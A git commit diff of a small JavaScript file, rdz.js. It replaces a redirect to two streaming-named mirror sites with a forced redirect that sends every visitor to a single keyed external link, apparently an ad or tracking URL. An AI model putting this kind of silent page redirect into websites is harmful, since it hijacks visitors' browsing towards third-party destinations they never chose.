54648bee39ec33b12d28c44fdb090a3a9465e398
movzen <90816406+movzen@users.noreply.github.com>
2022-01-29 19:38:39 +0800

    Update rdz.js

--- rdz.js
+++ rdz.js
@@ -1,5 +1,6 @@
-var urlmain = document.URL;
-var param = document.URL.split("/")[3].replace("?m=1","").replace("?m=0","");
-var dataUrl = ["https://dev-flixru.pantheonsite.io/","https://dev-neoflix.pantheonsite.io/"];
+var dataUrl = [
+
+  'https://inquiryclank.com/pgy7h6cw?key=756a1bbb1d4d12b56cb50d97b90b7a51'
+];
 var randomItem = dataUrl[Math.floor(Math.random()*dataUrl.length)];
-window.location = randomItem + param;
+window.location = randomItem;
